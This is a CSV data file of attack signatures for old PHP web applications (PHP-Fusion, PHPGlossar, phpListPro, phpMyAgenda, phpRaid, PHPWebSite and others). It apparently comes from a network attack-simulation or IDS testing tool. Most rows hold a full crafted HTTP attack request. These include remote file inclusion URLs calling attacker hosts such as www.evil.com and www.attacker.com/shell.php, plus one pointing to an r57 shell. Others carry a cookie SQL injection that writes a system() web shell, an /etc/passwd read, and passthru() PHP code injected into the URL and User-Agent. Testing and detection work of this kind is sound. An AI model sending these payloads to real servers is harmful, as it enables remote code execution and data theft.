XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
phpfusion_cmi.xml,"PHP-Fusion 6.00.306 Multiple Vulnerabilities Exploit
","This threat uses several crafted HTTP queries to upload arbitrary php code contained in a file with multiple extensions, and then cause the server to execute this code. PHP-Fusion is a web based application with typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpglossar_cmi.xml,PHPGlossar Version 0.8 <=  Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. PHPGlossar's add.php module is a web application that typically listens on port 80.,HTTP,TCP,GET /admin/inc/add.php?format_menue=http||3A ||//www.evil.com/cmd.txt? HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpglossar_cmi.xml,PHPGlossar Version 0.8 <=  Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. PHPGlossar's add.php module is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpim_cmi.xml,PHPIM Remote Command Injection /SQL Injection Flaw,"This threat leverages a cookie based SQL injection flaw, to insert php code, which is then executed by the server. PHPIM is a web application that typically listens on port 80.",HTTP,TCP,GET /php121login.php HTTP/1.0||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Host||3A || www.example.com||0D 0A ||Cookie||3A || php121un=%27UNION+SELECT+%27%3C%3Fphp+system%28%24_GET%5Bcmd%5D%29%3B%3F%3E%27+INTO+DUMPFILE+%27somefile%27+FROM+php121_users%2F%2A||3B || php121pw=suntzu||3B 0D 0A ||Connection||3A || Close||0D 0A 0D 0A 0D 0A||
phpim_cmi.xml,PHPIM Remote Command Injection /SQL Injection Flaw,"This threat leverages a cookie based SQL injection flaw, to insert php code, which is then executed by the server. PHPIM is a web application that typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpkit_cmi.xml,PHPKIT remote command execution exploit,This threat sends a crafted url containing PHP code which is executed by the server which then downloads a payload from a SMB server. PHPKIT is a web based application which typically listens on port 80.,HTTP,TCP,GET /phpkit/include.php?CMD=cat+%2Fetc%2Fpasswd&path=%5C%5C%5C%5C192.168.1.1%5C%5Cfoobar%5C%5Cbaz.php/ HTTP/1.1||0D 0A ||Host||3A || www.goog||06 ||e.com||0D 0A ||User-Agent||3A || GoogleBot 1.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpkit_cmi.xml,PHPKIT remote command execution exploit,This threat sends a crafted url containing PHP code which is executed by the server which then downloads a payload from a SMB server. PHPKIT is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phplistpro_cmi_a.xml,phpListPro config.php returnpath Variable Remote File Inclusion ,This threat sends a crafted HTTP GET query which is used to include an arbitrary php or html file by setting the returnpath global variable to include a remote file. phpListPro is a web based application with typically listens on port 80.,HTTP,TCP,"GET //config.php?returnpath=http||3A ||//www.yourspace.com/yourscript.txt?cat%/etc/passwd HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
phplistpro_cmi_a.xml,phpListPro config.php returnpath Variable Remote File Inclusion ,This threat sends a crafted HTTP GET query which is used to include an arbitrary php or html file by setting the returnpath global variable to include a remote file. phpListPro is a web based application with typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phplistpro_cmi_b.xml,phpListPro editsite.php returnpath Variable Remote File Inclusion ,This threat sends a crafted HTTP GET query which is used to include an arbitrary php or html file by setting the returnpath global variable to include a remote file. phpListPro is a web based application with typically listens on port 80.,HTTP,TCP,"GET //editsite.php?returnpath=http||3A ||//www.yourspace.com/yourscript.txt?&ls%20-laF HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
phplistpro_cmi_b.xml,phpListPro editsite.php returnpath Variable Remote File Inclusion ,This threat sends a crafted HTTP GET query which is used to include an arbitrary php or html file by setting the returnpath global variable to include a remote file. phpListPro is a web based application with typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phplistpro_cmi_c.xml,phpListPro in.php returnpath Variable Remote File Inclusion ,This threat sends a crafted HTTP GET query which is used to include an arbitrary php or html file by setting the returnpath global variable to include a remote file. phpListPro is a web based application with typically listens on port 80.,HTTP,TCP,"GET //in.php?returnpath=http||3A ||//www.yourspace.com/yourscript.txt?&ls%20-laF HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
phplistpro_cmi_c.xml,phpListPro in.php returnpath Variable Remote File Inclusion ,This threat sends a crafted HTTP GET query which is used to include an arbitrary php or html file by setting the returnpath global variable to include a remote file. phpListPro is a web based application with typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phplistpro_cmi_d.xml,phpListPro addsite.php returnpath Variable Remote File Inclusion ,This threat sends a crafted HTTP GET query which is used to include an arbitrary php or html file by setting the returnpath global variable to include a remote file. phpListPro is a web based application with typically listens on port 80.,HTTP,TCP,"GET //addsite.php?returnpath=http||3A ||//mitglied.lycos.de/n0ssy/r57.txt?&cmd=ls HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
phplistpro_cmi_d.xml,phpListPro addsite.php returnpath Variable Remote File Inclusion ,This threat sends a crafted HTTP GET query which is used to include an arbitrary php or html file by setting the returnpath global variable to include a remote file. phpListPro is a web based application with typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpmyagenda_cmi_a.xml,phpMyAgenda 3.0 Arbitrary Remote File Inclusion (agenda2.php3),"This threat leverages an arbitrary remote file inclusion into an arbitrary command execution flaw via the ""rootagenda"" argument to agenda.php3. phpMyAgenda is a web application which typically listens on port 80.",HTTP,TCP,"GET /agenda2.php3?rootagenda=http||3A ||//www.attacker.com/shell.php? HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
phpmyagenda_cmi_a.xml,phpMyAgenda 3.0 Arbitrary Remote File Inclusion (agenda2.php3),"This threat leverages an arbitrary remote file inclusion into an arbitrary command execution flaw via the ""rootagenda"" argument to agenda.php3. phpMyAgenda is a web application which typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpmyagenda_cmi_b.xml,phpMyAgenda 3.0 Arbitrary Remote File Inclusion (agenda2.php3),"This threat leverages an arbitrary remote file inclusion into an arbitrary command execution flaw via the ""rootagenda"" argument to agenda2.php3. phpMyAgenda is a web application which typically listens on port 80.",HTTP,TCP,"GET //agenda.php3?rootagenda=http||3A ||//www.attacker.com/shell.php? HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
phpmyagenda_cmi_b.xml,phpMyAgenda 3.0 Arbitrary Remote File Inclusion (agenda2.php3),"This threat leverages an arbitrary remote file inclusion into an arbitrary command execution flaw via the ""rootagenda"" argument to agenda2.php3. phpMyAgenda is a web application which typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpmydirectory_cmi.xml,phpMyDirectory 10.4.4 Remote File Inclusion Vulnerability,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via cron.php's ROOT_PATH parameter. Docebo is a web based application which typically listens on port 80.,HTTP,TCP,"GET /%2Fphpmydir%2Fcron.php%3FROOT_PATH%3Dhttp%3A%2F%2Fwww.attacker.com%2Fcmd.txt%3F%26cmd%3Dls HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
phpmydirectory_cmi.xml,phpMyDirectory 10.4.4 Remote File Inclusion Vulnerability,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via cron.php's ROOT_PATH parameter. Docebo is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpraid_cmi.xml,phpRaid Remote File Inclusion,"This threat sends a crafted url containing a local or remote path to PHP or HTML via auth.php ""phpbb_root_path"" parameter which is included by the server allowing arbitrary remote code execution. phpRaid is a web based application which typically listens on port 80.",HTTP,TCP,"GET /phpbb/auth/auth.php?phpbb_root_path=http||3A ||//www.yourcode.com/x.txt?&cmd=id HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
phpraid_cmi.xml,phpRaid Remote File Inclusion,"This threat sends a crafted url containing a local or remote path to PHP or HTML via auth.php ""phpbb_root_path"" parameter which is included by the server allowing arbitrary remote code execution. phpRaid is a web based application which typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpraid_cmi_b.xml,phpRaid Remote File Inclusion,"This threat sends a crafted url containing a local or remote path to PHP or HTML via auth.php ""phpbb_root_path"" parameter which is included by the server allowing arbitrary remote code execution. phpRaid is a web based application which typically listens on port 80.",HTTP,TCP,"GET /phpbb/auth/auth.php?smf_root_path=http||3A ||//www.yourcode.com/x.txt?&cmd=id HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
phpraid_cmi_b.xml,phpRaid Remote File Inclusion,"This threat sends a crafted url containing a local or remote path to PHP or HTML via auth.php ""phpbb_root_path"" parameter which is included by the server allowing arbitrary remote code execution. phpRaid is a web based application which typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpwebsite_cmi.xml,PHPWebSite 0.10.2 Remote Command Execution,"This threat simply builds a URL containing PHP code, as well as injecting code within the ""User-Agent"" header field which when combined with an arbitrary remote inclusion flaw allows the execution of arbitrary code. PHPWebSite is a web application which typically listens on port 80.",HTTP,TCP,GET /phpwebsite/<?php ob_clean()||3B ||echo 666||3B ||if (get_magic_quotes_gpc()) ||0A ||{$_GET[cmd]=striplashes($_GET[cmd])||3B ||}passthru($_GET[cmd])||3B ||echo 666||3B ||die||3B ||?> HTTP/1.1||0D 0A ||User-Agent||3A || <?php ob_clean()||3B ||echo 666||3B ||if (get_magic_quotes_gpc()) ||0A ||{$_GET[cmd]=striplashes($_GET[cmd])||3B ||}passthru($_GET[cmd])||3B ||echo 666||3B ||die||3B ||?>||0D 0A ||Host||3A || www.example.com||0D 0A ||Connection||3A || close||0D 0A 0D 0A||
phpwebsite_cmi.xml,PHPWebSite 0.10.2 Remote Command Execution,"This threat simply builds a URL containing PHP code, as well as injecting code within the ""User-Agent"" header field which when combined with an arbitrary remote inclusion flaw allows the execution of arbitrary code. PHPWebSite is a web application which typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
